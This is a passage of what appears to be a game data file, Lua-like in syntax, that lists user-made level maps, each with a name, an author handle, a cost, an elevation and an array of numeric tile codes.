,Vector(189,33,81),Vector(189,33,81),Vector(190,31,80),Vector(182,36,73),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(188,32,69),Vector(189,33,84),Vector(189,33,81),Vector(187,34,85),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(188,35,35),Vector(189,33,76),Vector(190,34,83),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="koronesuki",author="chong",id="#1650880337",direction="right",cost=225,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,60,60,60,5,60,60,60,60,60,60,60,60,60,60,0,0,0,0,0,60,60,60,5,60,60,60,60,60,60,60,60,60,60,60,96,0,0,0,0,60,60,60,5,66,66,60,60,60,0,0,60,60,60,60,60,96,60,60,60,60,60,60,5,60,60,60,60,0,0,0,0,60,60,60,60,96,60,60,60,60,60,60,60,5,60,60,60,0,0,0,0,60,60,60,60,96,60,60,2,60,60,60,60,60,60,60,60,0,0,0,0,60,60,60,60,96,60,60,2,60,60,60,60,60,60,60,60,0,0,0,0,60,60,60,60,96,60,60,60,60,60,60,60,60,60,60,60,0,0,0,0,60,60,60,60,96,60,60,60,60,60,60,60,60,60,60,60,0,0,0,0,60,60,60,96,0,0,0,0,0,60,60,60,60,60,60,60,0,0,0,0,60,60,60,0,0,0,0,0,0,0,60,60,60,60,60,60,0,0,0,0,60,60,0,0,0,0,0,0,0,0,0,60,60,91,60,60,0,0,0,0,60,0,0,0,0,0,0,0,0,0,0,0,91,97,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="pressE",author="chong",id="#1650880366",direction="forward",cost=856,elevation=0,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,5,95,95,95,95,95,95,1,5,5,1,95,95,95,95,95,95,5,1,1,5,1,95,95,95,95,95,1,5,5,1,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,1,5,5,1,95,95,95,95,95,1,5,1,1,5,1,5,5,5,5,5,1,5,5,1,5,5,5,5,5,1,5,1,1,5,1,95,95,95,95,95,5,95,95,5,95,95,95,95,95,1,5,1,1,95,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,95,1,1,95,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,95,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,93,95,95,95,95,95,95,95,95,95,95,95,95,94,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,1,95,95,95,95,95,95,95,95,95,95,95,95,95,95,1,5,1,1,5,5,95,95,95,95,95,95,95,95,95,95,95,95,95,95,5,5,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="kzorswim",author="chong",id="#1650880465",direction="right",cost=423,elevation=-18,map=[2,2,1,1,1,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,23,90,1,1,69,69,69,1,69,69,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,90,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,90,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,90,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,1,1,69,1,69,1,69,1,69,1,0,0,0,0,0,0,0,0,23,23,66,69,69,1,69,69,69,1,69,24,24,24,0,0,0,0,0,0,23,23,1,1,24,1,1,1,1,1,69,69,66,1,0,0,0,0,0,0,23,23,0,0,1,1,1,1,1,1,1,1,24,1,0,0,0,0,0,0,23,23,65,5,5,5,5,5,96,5,5,5,65,5,5,5,5,5,5,2,23,23,65,5,5,5,5,5,96,5,5,5,5,5,5,5,5,5,5,2,62,62,65,5,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,62,64,3,5,73,73,73,65,5,5,5,5,5,5,5,5,5,5,5,5,62,64,3,5,73,73,73,65,5,5,5,5,5,5,5,5,5,5,97,5]});
maps.push({name="Did you trigger",author="DVC",id="#1650884627",direction="right",cost=231,elevation=6,map=[0,0,0,0,0,0,14,3,2,2,3,14,1,1,1,1,1,1,0,0,0,0,0,0,0,1,14,5,5,5,5,14,96,12,12,12,12,12,0,0,0,0,0,0,0,1,14,6,6,6,6,14,1,0,0,0,12,12,0,0,0,0,0,0,0,1,14,7,7,7,7,14,1,0,0,0,12,12,0,0,0,0,0,0,0,1,14,8,8,8,8,14,1,0,0,0,12,12,0,0,0,0,0,0,0,1,14,9,9,9,9,14,1,0,0,0,12,12,0,0,0,0,0,0,0,1,14,10,10,10,10,14,1,0,0,0,12,12,0,0,0,0,0,0,0,0,14,11,11,11,11,14,0,0,0,0,12,12,0,0,0,0,0,0,0,0,14,11,11,11,11,14,0,0,0,0,96,11,96,1,97,0,0,0,0,0,14,11,11,11,11,11,92,0,0,0,11,96,95,2,17,17,17,17,17,17,17,11,11,11,11,11,92,0,0,0,11,96,95,2,17,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,96,11,96,1,17,4,12,0,0,0,92,12,12,12,12,0,0,0,0,0,0,0,0,0,17,12,12,0,0,0,92,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,92,92,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,66,16,66,14,66,12,12,12,12,0,0,0,0,0,0,0,0,0,100,18,66,16,66,14,66,12,12,12,12,0,0,0,0,0,0,0,0,0]});
maps.push({name="93x",author="93x",id="#1650885873",direction="right",cost=102,elevation=-15,map=[20,2,2,20,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,20,0,0,0,20,0,0,0,0,0,0,5,5,5,5,2,20,0,0,0,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,2,20,0,0,0,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,5,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,19,0,0,0,19,0,0,0,19,0,0,0,0,0,0,6,0,6,0,0,19,0,0,0,19,0,0,0,19,0,0,0,0,0,0,6,0,6,0,0,19,0,0,0,19,0,0,0,19,0,0,0,0,0,0,6,6,6,0,0,19,0,0,0,19,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,9,0,0,0,0,0,18,0,0,0,18,0,0,0,0,0,0,10,0,0,0,10,0,0,0,0,0,17,0,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,11,11,11,11,11,0,0,0,0,0,15,0,15,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,14,0,0,0,14,0,0,0,0,0,0,0,13,0,13,0,0,0,0,0,0,0,0,0,92,0,0,0,0,0,0,14,0,0,0,14]});
maps.push({name="Sooooo trigger",author="DVC",id="#1650885904",direction="forward",cost=146,elevation=9,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,100,31,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,31,100,31,31,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,31,31,0,0,0,29,0,0,0,0,0,5,5,0,0,0,0,0,29,0,0,0,0,0,29,29,0,0,0,0,0,5,5,0,0,0,0,0,29,29,0,0,0,0,0,0,0,27,0,0,0,5,5,0,0,0,27,0,0,0,0,0,0,0,0,0,27,27,0,0,0,5,5,0,0,0,27,27,0,0,0,0,0,0,0,0,0,0,0,25,0,5,5,0,25,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,5,5,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,97,33,32,31,30,29,28,27,26,5,5,26,27,28,29,30,31,32,33,97,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,5,5,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,25,1,96,96,1,25,0,0,0,0,0,0,0,0,0,0,0,27,27,0,0,1,91,91,1,0,0,27,27,0,0,0,0,0,0,0,0,0,27,0,0,1,95,95,1,0,0,27,0,0,0,0,0,0,0,29,29,0,0,0,0,1,5,5,1,0,0,0,0,29,29,0,0,0,0,0,29,0,0,0,0,1,92,92,1,0,0,0,0,29,0,0,0,31,31,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,31,31,100,31,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,31,100]});
maps.push({name="LITERALLY NOTHING",author="iProbie",id="#1650887009",direction="forward",cost=400,elevation=0,map});
maps.push({name="The Bridge",author="DVC",id="#1650888319",direction="forward",cost=616,elevation=1,map=[0,0,74,74,74,66,5,5,2,2,5,5,66,73,73,73,0,0,0,0,0,0,71,71,71,71,5,7,5,5,7,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,8,6,89,8,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,9,7,7,9,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,10,89,8,10,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,11,89,9,11,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,12,10,89,12,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,5,13,11,11,13,5,71,71,71,71,0,0,0,0,0,0,71,71,71,71,73,14,89,12,14,74,71,71,71,71,0,0,0,0,28,28,71,26,71,25,3,14,12,12,14,3,25,71,26,71,28,28,0,0,97,28,71,26,71,25,3,14,12,12,14,3,25,71,26,71,28,100,0,0,0,5,71,71,71,71,73,14,12,89,14,74,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,13,11,11,13,5,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,12,89,10,12,5,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,11,9,89,11,5,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,10,8,8,10,5,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,9,7,7,9,5,71,71,71,71,5,0,0,0,0,5,71,71,71,71,5,8,46,46,8,5,71,71,71,71,5,0,0,0,0,6,71,71,71,71,5,7,96,96,7,5,71,71,71,71,6,0,0,0,0,97,6,6,6,6,6,96,2,2,96,6,6,6,6,6,97,0,0,0]});
maps.push({name="dontcrouch",author="chong",id="#1650889019",direction="forward",cost=89,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,70,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="the seven islands",author="iProbie",id="#1650891316",direction="forward",cost=574,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,5,97,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,5,5,66,66,66,66,66,66,66,66,66,5,97,5,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,0,0,66,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,97,5,5,66,66,66,66,66,5,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,97,5,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,66,5,66,66,66,5,5,97,66,0,0,66,66,66,66,66,66,66,66,66,66,5,66,66,66,66,66,66,66,0,0,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,5,97,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,5,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,97,5,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,0,0,66,66,66,66,66,66,5,5,5,5,5,5,66,66,66,66,66,66,0,0,0,0,0,0,0,0,5,96,96,96,96,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,96,2,2,96,5,0,0,0,0,0,0,0]});
maps.push({name="Criss Cross",author="lamp",id="#1650891337",direction="forward",cost=176,elevation=0,map=[44,43,43,43,43,43,43,0,43,2,2,43,0,43,43,43,43,43,43,44,44,0,0,92,0,92,0,0,0,0,0,0,0,92,0,92,0,92,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,44,44,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,92,0,92,0,92,0,0,0,0,0,0,0,92,0,92,0,0,44,44,43,43,43,43,43,43,0,43,2,2,43,0,43,43,43,43,43,43,44]});
maps.push({name="4youreyesonly",author="GandalfThePimp",id="#1650893603",direction="forward",cost=186,elevation=0,map=[0,0,25,2,2,25,25,25,25,25,92,0,0,0,0,0,25,25,25,25,0,0,25,25,25,25,25,25,25,25,92,0,0,0,0,0,25,25,25,25,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,25,25,25,25,25,26,0,0,0,0,0,0,26,26,26,26,26,0,0,0,25,25,0,0,0,27,0,0,0,0,0,0,26,26,26,26,26,27,0,0,26,26,0,0,94,27,0,0,0,0,0,0,26,26,26,26,26,27,0,0,26,26,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,27,27,26,26,26,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,0,0,0,4,4,0,0,0,0,0,0,0,28,28,27,27,27,0,0,0,0,0,0,19,19,39,39,0,0,0,0,0,0,0,0,27,27,0,0,0,0,0,0,39,39,39,39,0,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,5,5,39,39,39,39,0,0,0,0,0,5,66,66,5,0,25,25,25,5,66,66,19,39,0,40,0,0,0,25,25,25,5,5,25,25,25,25,25,5,66,66,19,39,0,40,93,0,0,0,0,0,25,25,25,25,25,25,0,0,5,5,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,2,2,25,25,0,0,0,0,0,0,0,0,0]});
maps.push({name="DARE",author="GandalfThePimp",id="#1650893945",direction="left",cost=159,elevation=1,map=[1,1,1,0,0,25,2,2,25,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,25,25,25,25,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,25,25,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,85,0,0,26,26,0,0,0,0,0,0,0,0,0,1,1,1,0,85,0,0,0,0,26,26,27,27,27,28,28,28,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,28,0,0,0,0,0,0,85,0,34,35,35,35,35,36,95,37,38,38,1,29,0,0,0,0,0,0,0,0,33,0,0,0,1,1,1,0,0,38,1,29,0,0,0,0,0,0,0,85,33,0,0,0,0,0,1,0,0,39,1,29,0,0,0,0,0,0,0,0,33,33,32,32,31,0,1,0,0,39,1,30,0,0,0,0,0,0,0,0,0,0,0,0,31,0,1,38,38,39,1,30,0,0,0,0,0,0,0,0,85,0,30,30,30,0,1,38,1,1,1,31,0,0,0,0,0,0,0,0,0,0,29,0,0,0,1,38,1,32,32,31,0,0,0,0,0,0,26,26,27,28,29,0,1,1,0,37,1,32,0,0,0,0,0,0,0,0,2,26,0,0,0,1,0,0,0,37,1,32,0,0,0,0,0,0,0,0,2,26,0,0,1,0,35,36,36,36,1,33,0,0,0,0,1,1,1,0,26,26,0,1,0,0,35,1,1,1,1,33,0,0,0,0,1,0,1,0,0,0,0,0,0,0,35,35,35,34,34,33,0,0,0,0,1,1,1,0,0,0,85,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,85,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="The holy cross",author="Flandre Scarlet",id="#1650894210",direction="forward",cost=352,elevation=0,map=[76,76,76,67,0,0,0,14,14,2,2,14,14,0,0,0,67,76,76,76,76,1,76,67,0,0,0,0,91,91,91,91,0,0,0,0,67,76,1,76,76,76,76,67,0,0,0,0,0,91,91,0,0,0,0,0,67,76,76,76,67,67,67,67,0,0,0,0,0,14,14,0,0,0,0,0,67,67,67,67,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,14,74,74,74,74,74,74,14,14,14,14,73,73,73,73,73,73,14,0,14,14,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,14,14,93,14,0,0,14,14,0,0,14,14,14,14,0,0,14,14,0,0,14,93,14,14,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,14,14,0,14,74,74,74,74,74,74,14,14,14,14,73,73,73,73,73,73,14,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,67,67,67,67,0,0,0,0,0,14,14,0,0,0,0,0,67,67,67,67,76,76,76,67,0,0,0,0,0,14,14,0,0,0,0,0,67,76,76,76,76,1,76,67,0,0,0,0,14,14,14,14,0,0,0,0,67,76,1,76,76,76,76,67,0,0,0,14,14,2,2,14,14,0,0,0,67,76,76,76]});
maps.push({name="defense1337",author="GandalfThePimp",id="#1650895168",direction="right",cost=357,elevation=0,map=[0,0,0,19,19,2,2,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,19,5,5,5,5,5,5,0,5,5,5,0,5,19,19,19,0,0,0,19,5,5,5,5,5,5,5,0,5,5,5,0,0,5,5,19,0,0,19,5,5,5,5,0,5,5,5,5,5,5,5,5,0,0,5,0,19,0,19,5,0,5,5,5,5,5,5,5,5,5,5,10,10,10,5,5,19,19,5,5,5,6,6,6,6,5,5,5,5,0,6,10,45,45,10,5,19,19,5,5,10,10,45,45,10,10,5,5,5,5,6,45,45,45,10,5,19,19,5,5,10,45,45,45,45,10,5,5,5,5,6,10,45,45,10,5,19,19,5,5,10,45,45,45,45,10,5,5,5,5,5,10,10,10,5,5,19,19,5,5,10,45,45,45,45,10,5,5,5,5,5,5,5,5,5,5,19,19,5,5,5,10,10,10,10,5,5,5,0,5,5,5,5,5,5,5,2,19,5,5,5,5,0,5,5,5,5,5,5,5,5,5,5,5,5,5,2,19,0,5,5,15,5,5,5,5,5,5,5,5,5,5,5,5,5,5,19,19,5,5,15,100,15,26,27,5,5,5,5,6,6,6,6,5,5,5,19,19,5,5,5,15,1,1,28,5,5,5,5,10,45,45,10,5,5,0,19,19,5,5,5,34,1,1,29,5,5,5,5,10,45,45,10,5,5,5,19,19,5,5,5,33,32,31,30,5,5,5,0,5,10,10,5,5,5,5,19,19,14,5,5,5,5,5,5,5,5,5,5,5,5,5,5,19,19,19,19,4,15,5,5,0,5,0,5,5,5,5,5,19,19,19,19,0,0,0,93,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0]});
maps.push({name="Death Star",author="GandalfThePimp",id="#1650895363",direction="forward",cost=340,elevation=0,map=[97,25,0,25,25,0,0,0,0,2,2,0,0,0,0,25,0,0,25,99,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,25,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,25,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,25,25,0,0,5,5,5,1,1,5,5,5,5,1,1,5,5,5,0,0,25,0,0,5,5,5,1,1,1,5,5,5,5,1,1,1,5,5,5,0,0,0,5,5,5,1,1,1,1,5,92,92,5,1,1,1,1,5,5,5,0,1,5,5,1,1,1,1,19,19,19,19,19,19,1,1,1,1,5,5,1,1,5,5,1,1,1,1,19,19,19,19,19,19,1,1,1,1,5,5,1,1,5,5,1,1,1,1,95,95,24,24,95,95,1,1,1,1,5,5,1,1,96,96,1,1,1,1,19,19,94,19,19,19,1,1,1,1,98,98,1,1,5,5,1,1,1,1,91,91,91,91,91,91,1,1,1,1,5,5,1,1,5,5,1,1,1,1,19,19,19,19,19,19,1,1,1,1,5,5,1,0,5,5,5,1,1,1,1,5,92,92,5,1,1,1,1,5,5,5,0,0,0,5,5,5,1,1,1,5,5,5,5,1,1,1,5,5,5,0,0,25,0,0,5,5,5,1,1,5,5,5,5,1,1,5,5,5,0,0,25,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,25,0,0,25,25,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,25,0,0,0,100,25,0,0,25,0,0,0,0,2,2,0,0,0,0,0,0,0,25,88]});
maps.push({name="Split",author="Jando",id="#1650898560",direction="forward",cost=118,elevation=4,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,20,17,17,20,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,21,0,0,21,17,17,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,17,97,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,21,17,17,0,0,0,0,0,0,0,0,0,0,0,0,99,17,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,17,17,21,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,101,101,0,0,0,21,17,102,0,0,0,0,0,0,0,0,0,0,0,0,101,101,21,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,104,17,0,0,0,0,103,103,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,23,23,0,103,103,0,0,0,0,0,0,0,0,0,0,0,21,17,17,17,17,17,17,17,17,21,0,0,0,0,0,0,0,0,0,0,0,21,0,0,18,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="TheFloorAggresiveIs",author="Kaiser Pepe",id="#1650907123",direction="right",cost=187,elevation=14,map=[0,0,0,0,0,0,2,2,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,1,28,28,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,27,1,1,28,94,0,0,0,0,0,0,0,0,0,0,0,0,27,27,28,87,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,1,85,85,0,27,1,1,28,94,0,0,0,0,0,0,0,0,0,0,0,1,27,27,0,0,0,1,28,28,0,0,0,0,0,0,0,34,34,0,0,1,29,30,0,0,0,1,1,1,0,0,0,0,0,0,0,93,34,0,0,1,31,32,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,86,34,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,93,34,1,0,0,96,96,91,35,35,35,35,35,35,35,35,35,35,0,0,34,34,1,0,0,33,33,0,0,0,0,0,0,0,1,35,87,35,0,34,34,1,1,0,0,86,86,0,0,0,0,0,0,0,1,35,35,35,0,34,34,0,0,0,0,35,35,1,1,1,0,0,0,0,1,1,1,91,0,34,34,0,0,0,0,35,35,85,35,35,0,35,0,36,99,0,1,91,0,0,0,0,0,0,0,35,35,35,35,85,0,35,0,36,36,0,1,37,0,0,34,0,0,0,0,85,36,1,1,1,0,0,0,0,0,0,1,38,0,0,0,0,0,0,0,38,38,1,0,0,0,0,0,0,0,0,0,0,0,34,97,0,0,0,0,38,38,1,0,0,0,39,0,91,39,39,85,39,2,0,0,0,0,0,0,98,98,39,39,39,0,0,0,39,85,39,39,39,2,0,0,0,0,0,0,39,39,39,39,39,0,39,0,91,39,85,39,39,0]});
